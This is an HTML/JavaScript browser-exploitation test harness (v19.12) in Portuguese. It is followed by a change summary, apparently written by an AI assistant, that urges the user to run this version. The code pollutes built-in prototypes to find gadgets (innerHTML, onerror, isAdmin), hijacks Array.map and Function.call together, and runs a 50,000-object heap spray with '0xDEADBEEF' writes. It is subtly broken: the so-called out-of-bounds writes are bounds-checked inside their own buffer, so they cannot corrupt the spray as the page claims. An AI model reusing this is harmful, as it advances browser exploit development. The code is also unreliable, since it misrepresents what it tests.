<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Suite de Testes Focada em Exploit (v19.12)</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 50vh;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        #summary {
            background: #2a2a2a;
            border: 1px solid #555;
            padding: 10px;
            margin-top: 15px;
            font-size: 13px;
            max-height: 70vh;
            overflow-y: auto;
        }
        #summary h2 { margin-top: 0; color: #eee; font-size: 15px; border-bottom: 1px solid #444; padding-bottom: 5px;}
        #summary ul { padding-left: 20px; margin: 5px 0; }
        #summary li { margin-bottom: 3px; }

        /* Estilos de Log */
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-critical { color: #f0f; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; }
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Suite de Testes Focada em Exploit (v19.12)</h1>
    <p>Foco: PP Avançada/Gadgets, Combinação de Gadgets PP, Heap Spray + OOB Write Agressivo.</p>
    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.12)</button>
    <div id="output"></div>
    <hr>
    <div id="summary"></div>

    <script>
        // --- Script Focado em Exploit (v19.12) ---
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 500;
        const LONG_PAUSE = 1500; // Pausa mais longa para GC/Spray
        let findings = []; // Array único para todos os findings
        let ppGadgetsBroken = {}; // Armazena quais gadgets quebraram

        const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];

        // Função log (v19.9)
        const log = (message, type = 'info', funcName = '') => {
            let keepLog = IMPORTANT_LOG_TYPES.includes(type);
             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido') || lowerMsg.includes('não parece ter sido afetado') || lowerMsg.includes('restaurado') || lowerMsg.includes('não quebrado') || lowerMsg.includes('executada com sucesso') || lowerMsg.includes('nenhum leak encontrado') || lowerMsg.includes('não foi possível analisar') || lowerMsg.includes('não interceptada')) { keepLog = true; } } // Added more 'good' cases
            if (!keepLog) return;
            if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if (['vuln', 'critical', 'escalation', 'ptr', 'leak'].includes(type)) { findings.push({ type, funcName, message: sanitizedMessage, time: timestamp }); } if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
        };

        // Funções Helper (v19.0)
        const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
        const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };

        // --- Testes Prioritários (v19.12) ---

        // Teste 1: PP Avançada / Gadgets (v19.7 - Armazena estado)
        const testAdvancedPP = async () => {
            const FNAME = 'testAdvancedPP';
            log("--- Iniciando Teste 1: PP Avançado (Gadgets++) ---", 'test', FNAME);
            ppGadgetsBroken = {}; // Limpar estado anterior
            const propsToPollute = [ /* ... Lista completa de propsToPollute ... */ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[1,2].join(); return null;} catch(e){ return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ];
            const testValue = "PP_Adv_Polluted_" + Date.now();
            let successCount = 0; let gadgetCount = 0; let gadgetMessages = [];
            for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){} if (gadgetMsg) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; ppGadgetsBroken[`${targetProtoName}.${prop}`] = true; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); }
            log(`--- Teste 1 Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
            if (gadgetCount > 0) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME); }
            await PAUSE();
        };

        // Teste 2: v19.12: Combinação de Gadgets PP (map + call)
        const testPPGadgetCombination = async () => {
            const FNAME = 'testPPGadgetCombination';
            log("--- Iniciando Teste 2: Combinação de Gadgets PP (map + call) ---", 'test', FNAME);

            // Verificar se ambos os gadgets foram quebrados
            if (!ppGadgetsBroken['Array.map'] || !ppGadgetsBroken['Function.call']) {
                let missing = [];
                if (!ppGadgetsBroken['Array.map']) missing.push('Array.map');
                if (!ppGadgetsBroken['Function.call']) missing.push('Function.call');
                log(`Gadget(s) necessários (${missing.join(', ')}) não quebrados no Teste 1. Pulando.`, 'good', FNAME);
                log("--- Teste 2 Concluído (Pulado) ---", 'test', FNAME);
                return;
            }

            const originalMap = Array.prototype.map;
            const originalCall = Function.prototype.call;
            let mapHijackExecuted = false;
            let callHijackExecutedViaMap = false;
            let contextReceivedInCall = null;

            try {
                // Função para sequestrar map
                const hijackedMapFunction = function(callback, thisArg) {
                    mapHijackExecuted = true;
                    log("===> Array.map SEQUESTRADO EXECUTADO! <===", 'vuln', `${FNAME}-Map`);
                    log(` -> Tentando chamar originalMap...`, 'info', `${FNAME}-Map`);
                    try {
                        // Chamar o map original, esperando que ele use .call internamente
                        return originalMap.call(this, callback, thisArg);
                    } catch (e) {
                        log(` -> Erro ao chamar originalMap.call: ${e.message}`, 'warn', `${FNAME}-Map`);
                        return []; // Retornar array vazio em caso de erro
                    }
                };

                // Função para sequestrar call
                const hijackedCallFunction = function(thisArg, ...args) {
                     // Logar APENAS se for chamado a partir do map hijackado (ou explicitamente)
                     // Esta verificação é frágil, depende da pilha de chamadas ou de flags
                     // Vamos usar uma flag simples para a chamada explícita
                     if (hijackedCallFunction.calledExplicitly || mapHijackExecuted) {
                         log(`===> Function.call SEQUESTRADO! (Contexto: ${hijackedCallFunction.calledExplicitly ? 'Explícito' : 'map?'}) <===`, 'vuln', `${FNAME}-Call`);
                         let thisStr = '[Não foi possível analisar this]';
                         try { thisStr = this.name || this.toString().substring(0, 80) + '...'; } catch(e){}
                         log(` -> 'this' (Função Original?): ${thisStr}`, 'info', `${FNAME}-Call`);
                         if (!hijackedCallFunction.calledExplicitly && mapHijackExecuted) {
                             callHijackExecutedViaMap = true;
                             contextReceivedInCall = this; // Salvar o 'this' recebido
                         }
                     }
                     // Resetar flag
                     hijackedCallFunction.calledExplicitly = false;
                     // Chamar original (com cuidado)
                     try {
                          return originalCall.apply(this, [thisArg, ...args]);
                     } catch(e) {
                          log(` -> Erro ao chamar originalCall.apply: ${e.message}`, 'warn', `${FNAME}-Call`);
                          return undefined;
                     }
                };
                hijackedCallFunction.calledExplicitly = false; // Flag para diferenciar chamadas

                // Poluir ambos
                log("Poluindo Array.prototype.map e Function.prototype.call...", 'info', FNAME);
                Array.prototype.map = hijackedMapFunction;
                Function.prototype.call = hijackedCallFunction;

                // Ativar o gadget map, esperando que ele chame o call sequestrado
                log("Chamando [1, 2].map(x => x)...", 'info', FNAME);
                try {
                    [1, 2].map(x => x);
                    log(` -> Chamada para map concluída.`, 'good', FNAME);
                } catch (e) {
                    log(` -> Erro ao chamar map sequestrado: ${e.message}`, 'error', FNAME);
                }

                // Chamar call explicitamente para garantir que o hijack funciona
                log("Chamando (()=>{}).call(null) explicitamente...", 'info', FNAME);
                 try { const dummyFunc = () => {}; hijackedCallFunction.calledExplicitly = true; dummyFunc.call(null); } catch (e) {}


                await PAUSE(MEDIUM_PAUSE); // Dar tempo para logs

                if (callHijackExecutedViaMap) {
                    log(`VULN: Hijack de Function.call foi ATIVADO durante a execução do map sequestrado!`, 'vuln', FNAME);
                    let contextType = typeof contextReceivedInCall;
                    try { contextType = Object.prototype.toString.call(contextReceivedInCall); } catch(e){}
                    log(` -> Contexto ('this') recebido em 'call': ${contextType}`, 'info', FNAME);
                    log(` ---> *** ALERTA: Interação entre Gadgets PP confirmada (map -> call)! ***`, 'escalation', FNAME);
                } else {
                    log(`Hijack de Function.call não parece ter sido ativado pela chamada a map.`, 'warn', FNAME);
                }

            } catch (e) {
                log(`Erro fatal durante Teste 2: ${e.message}`, 'error', FNAME);
                console.error(e);
            } finally {
                // Restaurar SEMPRE na ordem inversa ou independentemente
                if (Array.prototype.map !== originalMap) {
                    Array.prototype.map = originalMap;
                    log("Array.prototype.map restaurado.", 'good', 'Cleanup');
                }
                 if (Function.prototype.call !== originalCall) {
                    Function.prototype.call = originalCall;
                    log("Function.prototype.call restaurado.", 'good', 'Cleanup');
                }
            }
            log(`--- Teste 2 Concluído (map hijack: ${mapHijackExecuted}, call via map: ${callHijackExecutedViaMap}) ---`, 'test', FNAME);
        };


        // Teste 3: v19.12: Heap Spray + OOB Write Agressivo
        const testAggressiveOOBWrite = async () => {
            const FNAME = 'testAggressiveOOBWrite';
            log("--- Iniciando Teste 3: Heap Spray + OOB Write Agressivo ---", 'test', FNAME);
            const sprayCount = 50000; // Spray muito maior
            const controlBufferSize = 64;
            const allocationSize = controlBufferSize + 128; // Buffer de controle menor é ok
            const baseOffsetInBuffer = 64;
            const oobWriteValue = 0xDEADBEEF;
            const initialDataValue = 0xAAAAAAAA;
            const sprayedObjects = [];
            let controlBuffer = null;
            let dv = null;
            let oobWriteSuccessCount = 0;
            let hitSuccess = false;
            const writeAttemptsPerOffset = 5; // Escrever várias vezes no mesmo offset

            // Offsets OOB relativos ao fim do buffer de controle (foco em offsets pequenos)
            const oobOffsetsToWrite = [4, 8, 12, 16, 20, 24, 28, 32, 48, 64];

            try {
                // --- Heap Spray Agressivo ---
                log(`Realizando spray AGRESSIVO de ${sprayCount} objetos {id, data}...`, 'info', FNAME);
                for (let i = 0; i < sprayCount; i++) {
                    sprayedObjects.push({ id: i, data: initialDataValue });
                    if (i % 5000 === 0) await PAUSE(1); // Pequena pausa durante spray massivo
                }
                log(`Spray concluído.`, 'info', FNAME);
                await PAUSE(LONG_PAUSE); // Pausa longa após spray massivo

                // --- Alocar Buffer de Controle ---
                controlBuffer = new ArrayBuffer(allocationSize);
                dv = new DataView(controlBuffer);
                for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xCC);
                log("Buffer de controle alocado.", 'info', FNAME);
                await PAUSE(SHORT_PAUSE);

                // --- Tentar Escrita OOB Agressiva ---
                log(`Tentando escrita OOB (${toHex(oobWriteValue)}) em ${oobOffsetsToWrite.length} offsets, ${writeAttemptsPerOffset}x cada...`, 'info', FNAME);
                for (const offset of oobOffsetsToWrite) {
                    const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + offset;
                    const relOffsetStr = `ctrlEnd+${offset} (addr ${targetWriteAddr})`;
                    let offsetWriteOk = false;
                    for (let attempt = 0; attempt < writeAttemptsPerOffset; attempt++) {
                        try {
                            if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
                                dv.setUint32(targetWriteAddr, oobWriteValue, true);
                                oobWriteSuccessCount++;
                                offsetWriteOk = true;
                                // Não restaurar aqui, continuar escrevendo no mesmo offset
                            }
                        } catch(e) {
                             // Logar falha apenas uma vez por offset
                             if (attempt === 0) log(` -> Escrita OOB U32 FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`);
                             offsetWriteOk = false; // Marcar como falha se qualquer tentativa falhar
                             break; // Parar tentativas neste offset se falhar
                        }
                    }
                    // Restaurar apenas no final das tentativas para este offset
                    if(offsetWriteOk && targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength) {
                         try { dv.setUint32(targetWriteAddr, 0xCCCCCCCC, true); } catch(e){}
                    }
                    await PAUSE(1); // Pausa mínima entre offsets
                }
                log(`Tentativas de escrita OOB concluídas (${oobWriteSuccessCount} escritas realizadas).`, 'info', FNAME);

                // --- Verificação Exaustiva ---
                if (oobWriteSuccessCount > 0) {
                    log(`Verificando ${sprayCount} objetos do spray por corrupção... (Pode demorar)`, 'info', FNAME);
                    await PAUSE(LONG_PAUSE); // Pausa longa antes da verificação
                    let hitCount = 0;
                    for(let i = 0; i < sprayCount; i++) {
                        if (sprayedObjects[i]?.data === oobWriteValue) {
                            hitSuccess = true;
                            hitCount++;
                            log(`---> VULN: Objeto spray ${i} teve 'data' CORROMPIDO para ${toHex(oobWriteValue)}! <---`, 'critical', FNAME);
                            log(` ---> *** ALERTA: Primitivo Relevante (OOB Write Controlado sobre Dados do Heap) ***`, 'escalation', FNAME);
                        }
                         if (i % 5000 === 0) await PAUSE(1); // Pausa durante verificação
                    }
                    if (hitSuccess) {
                        log(`SUCESSO: ${hitCount} objeto(s) do spray foram atingidos pela escrita OOB!`, 'vuln', FNAME);
                    } else {
                        log(`Nenhum objeto do spray parece ter sido atingido pela escrita OOB.`, 'good', FNAME);
                    }
                } else {
                    log("Nenhuma escrita OOB foi realizada, verificação de corrupção pulada.", 'warn', FNAME);
                }

            } catch (e) {
                log(`Erro fatal no Teste 3: ${e.message}`, 'error', FNAME);
                console.error(e);
            } finally {
                sprayedObjects.length = 0; // Limpar spray
                log(`--- Teste 3 Concluído (OOB Write Hits: ${hitSuccess ? 'Sim' : 'Não'}) ---`, 'test', FNAME);
            }
            return hitSuccess;
        };


        // --- Função Principal de Execução (v19.12) ---
        const runExploitFocusedTests = async () => {
            const FNAME = 'runExploitFocusedTests';
            if (runBtn) runBtn.disabled = true; findings = [];
            const summaryDiv = document.getElementById('summary');
            if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.12) ====", 'test', FNAME);

            await testAdvancedPP(); // Teste 1: Confirmar gadgets PP
            await PAUSE(MEDIUM_PAUSE);

            await testPPGadgetCombination(); // Teste 2: Tentar combinação map+call
            await PAUSE(MEDIUM_PAUSE);

            await testAggressiveOOBWrite(); // Teste 3: OOB Write Agressivo + Heap Spray
            await PAUSE(MEDIUM_PAUSE);

            log("\n==== GERANDO SUMÁRIO FINAL ====", 'test', FNAME);
            if (summaryDiv) {
                summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
            }
            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.12) ====", 'test', FNAME);
            if (runBtn) runBtn.disabled = false;
        };
    </script>

</body>
</html>
```

**Resumo das Mudanças (v19.12):**

1.  **`testAdvancedPP` (Teste 1):** Mantido para confirmar gadgets.
2.  **Novo Teste: `testPPGadgetCombination` (Teste 2):**
    * Polui `Array.prototype.map` e `Function.prototype.call` simultaneamente com funções sequestradoras.
    * Chama `[].map()` e a função que sequestrou `call` regista se foi chamada *durante* a execução de `map`.
    * Loga se a interação entre os gadgets foi detectada.
3.  **Novo Teste: `testAggressiveOOBWrite` (Teste 3):**
    * Realiza um spray massivo (50.000 objetos).
    * Tenta escritas OOB repetidas (`0xDEADBEEF`) em offsets pequenos (+4 a +64) após o buffer de controlo.
    * Verifica *todos* os objetos do spray para ver se a propriedade `data` foi corrompida.
4.  **Testes Removidos:** Testes de Info Leak anteriores e hijack simples foram removidos.
5.  **Ordem e Numeração:** Atualizada.
6.  **Versionamento:** Atualizado para v19.12.

Execute esta versão. Os pontos chave são:

* **Teste 2:** O log `Hijack de Function.call foi ATIVADO durante a execução do map sequestrado!` indicaria sucesso na combinação de gadgets.
* **Teste 3:** O log `SUCESSO: X objeto(s) do spray foram atingidos...` indicaria que a escrita OOB cega finalmente funcionou para corromper dados controlados.

Boa sorte! Este teste pode ser demorado devido ao spray agressi
